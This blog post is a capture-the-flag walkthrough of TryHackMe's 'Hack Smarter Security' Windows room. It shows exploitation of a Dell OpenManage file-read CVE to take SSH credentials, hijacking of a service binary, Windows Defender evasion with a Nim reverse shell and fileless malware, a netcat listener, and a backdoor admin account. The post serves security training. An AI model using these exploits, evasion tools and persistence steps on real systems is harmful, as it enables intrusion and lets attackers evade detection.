---
date: 2024-03-22T16:28:33-05:00
# description: ""
image: "/images/THM-HackSmarterSecurity/hack-smarter.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Hack Smarter Security"
type: "post"
---

* Platform: TryHackMe
* Link: [Hack Smarter Security](https://tryhackme.com/r/room/hacksmartersecurity)
* Level: Medium
* OS: Windows
---

In this challenge we exploit a Windows Server machine feature SSH (which is not usual). After exploiting an uncommon service we find ourselves having to bypass Windows Defender in order to achieve administrative privileges.

The target IP address is `10.10.189.226`.

## Recon

```
nmap -sC -sV -oA nmap/Hack-Smarter-Security 10.10.189.226
```

Several ports are found to be opened:
* FTP is running on port 21, with anonymous login allowed
* SSH on port 22, which can potentially be our way into the system if credentials are found
* A Windows IIS server is running on port 80
* From the nmap results it is not clear which service is running on port 1311 
* Windows WBT server is running on port 3389, this is used for Windows Remote Desktop and Remote Assistance connections

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 18:27 CDT
Nmap scan report for 10.10.160.34
Host is up (0.24s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HackSmarterSec
1311/tcp open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Mon, 18 Mar 2024 23:28:22 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Mon, 18 Mar 2024 23:28:29 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-18T23:29:06+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2024-03-17T23:23:26
|_Not valid after:  2024-09-16T23:23:26
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-18T23:29:00+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.94SVN%T=SSL%I=7%D=3/18%Time=65F8CE13%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securi
SF:ty:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20
SF:accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x2
SF:0Mon,\x2018\x20Mar\x202024\x2023:28:22\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20
SF:Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\
SF:">\r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20conte
SF:nt=\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>
SF:\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css
SF:/loginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script
SF:\x20type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20langua
SF:ge=\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\
SF:"/oma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20t
SF:ype=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"ja
SF:vascript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTT
SF:POptions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20ma
SF:x-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-en
SF:coding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Mon,\x20
SF:18\x20Mar\x202024\x2023:28:29\x20GMT\r\nConnection:\x20close\r\n\r\n<!D
SF:OCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//E
SF:N\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<ht
SF:ml>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text
SF:/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link
SF:\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmas
SF:ter\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=
SF:\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"java
SF:script\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/
SF:gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"tex
SF:t/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\
SF:"></script><script\x20language=\"javascript\">\r\n\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.56 seconds
```

## Enumeration

The nmap scan reveals that the FTP servers allows for anonymous login. After accessing the server we find two files `Credit-Cards-We-Pwned.txt` and `stolen-passport.png`.

![FTP files](/images/THM-HackSmarterSecurity/ftp-server.png)

The file `Credit-Cards-We-Pwned.txt` contains a list of credit cards information, which are definitely fake since this is a hacking challenge.

![Fake credit cards numbers](/images/THM-HackSmarterSecurity/fake-credit-cards.png)

The `stolen-passport.png` file fails to download because of the ASCII mode on the FTP server, images are often stored in binary format. 

![Password image transfer fails](/images/THM-HackSmarterSecurity/passport-img.png)

After switching to binary mode with `binary` the transfer is successful.

![Password image transfer success](/images/THM-HackSmarterSecurity/passport-img2.png)

Nothing of value is gained after running `strings` and `exiftool` on the file. This ends up being a rabbit hole leading to nothing exploitable.

![Picture of the eye of the room author](/images/THM-HackSmarterSecurity/passport-img3.png)

After visiting the website nothing of interest is found, it a static website without any working functionalities.

![Hackers website](/images/THM-HackSmarterSecurity/hackers-website.png)

Directory and subdomain enumeration with `gobuster` is also unfruitful.

Trying to access the service on port `1311` with `http://10.10.189.226:1311/` produces an error.

![port 1311 error](/images/THM-HackSmarterSecurity/port1311-error.png)

This can be solved by using `https` instead. We get a page running `Dell EMC OpenManage` login page.

![Dell OpenManage service](/images/THM-HackSmarterSecurity/dell-openmanage.png)

Attempting to bypass the login page via the exploit found in this [Tenable blog post](https://www.tenable.com/security/research/tra-2021-07) is unsuccessful.

After clicking on `About` we discover the software is running version `9.4.0.2`.

![Dell OMACS version](/images/THM-HackSmarterSecurity/Dell-OMACS-version.png)

Looking for exploits we find [CVE-2020-5377](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/), this is a file read vulnerability in `Dell OpenManage Server Administrator`and a PoC is found [here](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514). 

Following the usage instructions we attempt to exploit the target

```
python3 Dell-xploit.py 10.2.104.130 10.10.189.226:1311
```
![Dell file read exploit](/images/THM-HackSmarterSecurity/Dell-exploit.png)

We are able to read the files on the server. From the nmap scan we know that the target is running `Microsoft IIS` on port 80. 
* The root folder for IIS is located at `C:\inetpub\wwwroot`
* In the scan results we find `commonName=hacksmartersec` under port 1311
* We know the `web.config` file must be present at the content root path of the deployed application. You can read more about it [here](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0)

Applying all the information we have, credentials for the user `tyler` are found at `C:\inetpub\wwwroot\hacksmartersec\web.config`.

![Tyler SSH credentials found](/images/THM-HackSmarterSecurity/creds.png)

## Foothold

Using `tyler:IAmA1337h4x0randIkn0wit!` we are able to login via SSH.

![SSH access with user tyler credentials](/images/THM-HackSmarterSecurity/ssh-access.png)

### What is user.txt? 

The user flag `user.txt` is then accessible at `C:\Users\tyler\Desktop\user.txt`.

![User flag](/images/THM-HackSmarterSecurity/user-flag.png)

## Privilege Escalation

### Creating a new admin account

We now need to find some privilege escalation paths. Attempting to use `winPEAS` for system enumeration fails, it gets flagged and stopped by Microsoft Defender.

![winPEAS fails because of Windows Defender](/images/THM-HackSmarterSecurity/winpeas-fail.png)

[PrivescCheck](https://github.com/itm4n/PrivescCheck/tree/master) works without being blocked by Defender. 

![PrivescCheck works despite Microsoft Defender](/images/THM-HackSmarterSecurity/privesccheck.png)

A few non-default services are found.

![A few non-default services are discovered](/images/THM-HackSmarterSecurity/non-default-services.png)

In the `Services binary permissions` section  we find a vulnerable service called `spoofer-scheduler`. We can potentially replace `spoofer-scheduler.exe` with a malicious file of the same name to escalate our privileges since the user `tyler` has all the necessary permissions.

![Vulnerable service found](/images/THM-HackSmarterSecurity/vulnerable-service.png)

We have to keep in mind that Windows Defender is active, so if the reverse shell isn't stealthy enough it will get flagged. We do have a few different ways to achieve our goals.

A reverse shell written in Nim that bypasses Windows Defender is available [here](https://github.com/Sn1r/Nim-Reverse-Shell).

We stop the service with `Stop-Service -Name "spoofer-scheduler"` and we remove the executable with `rm spoofer-scheduler.exe`.

> Don't forget to compile the reverse shell with `nim c -d:mingw --app:gui rev_shell.nim`.

The Nim reverse shell is sent to the target after compilation.

![Malicious executable file on the target](/images/THM-HackSmarterSecurity/malicious-exe.png)

After restarting the service with `Start-Service -Name "spoofer-scheduler"` we get a reverse shell running a privileged account.

![Privileged shell obtained](/images/THM-HackSmarterSecurity/privileged-shell.png)

But the shell is unstable and dies quickly. Because the service is not starting properly (since we replaced the file), WIndows is timing it out.

![Service cannot be started and gets timed out](/images/THM-HackSmarterSecurity/service-error.png)

To establish persistence a new user can quickly be created and added to the `administrators` group to gain admin privileges.

```
net user <username> <password> /add
net localgroup administrators <username> /add
```
![Persistence is achieved via the creation of a new privileged user](/images/THM-HackSmarterSecurity/persistence-account.png)

The newly created account can then be used to access the system via SSH.

![Privileges of the newly created admin account](/images/THM-HackSmarterSecurity/persistence-account-privs.png)

#### Which organizations is the Hack Smarter group targeting next? 

Since we have admin privileges we can access the list of the next targets at `C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt`.

![Hackers' targets list](/images/THM-HackSmarterSecurity/hacking-targets.png)

### Using fileless malware 

Another method to bypass Windows Defender is to use [SecUp](https://github.com/daniellowrie/update_script). It is a "fileless malware that bypasses Windows Defender using PowerShell and obfuscation." You can also check the [YouTube video](https://www.youtube.com/watch?v=LjoAV3O40og&ab_channel=DanielLowrie) for an explanation.

1. Clone the repository 

```
git clone https://github.com/daniellowrie/update_script
```

2. Start the engine. It also starts an HTTP server to transfer the malcious files.

```
go run SecUp.go 10.2.104.130
```

![go run command](/images/THM-HackSmarterSecurity/go-run.png)

3.  Set up a listener on port 443

```
nc -lnvp 443
```

4. The compilation process creates a file named `update_script.exe` 

```
GOOS=windows go build update_script.go
```

![files compilation](/images/THM-HackSmarterSecurity/malware-exe.png)

5. Rename the malicious file as `spoofer-scheduler.exe` to make it work on the target.

```
mv update_script.exe spoofer-scheduler.exe
```

On the target stop the service, replace the legitimate file with your malicious file and restart the service. You should see the files getting uploaded on the target.

![Malware working successfully](/images/THM-HackSmarterSecurity/malware-success.png)

On the listener we get a shell with admin privileges that does not die.

![Stable shell that does not die received](/images/THM-HackSmarterSecurity/admin-shell.png)

And that's all I have for you on this one! There are many more ways to evade antiviruses/EDRs, one of which is [AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/), I encourage you to learn and practice different methods. If you are into books I highly recommend [Evading EDR: The Definitive Guide to Defeating Endpoint Detection Systems](https://www.amazon.com/Evading-EDR-Definitive-Defeating-Detection/dp/1718503342) and [Antivirus Bypass Techniques](https://www.amazon.com/Antivirus-Bypass-Techniques-practical-techniques/dp/1801079749).
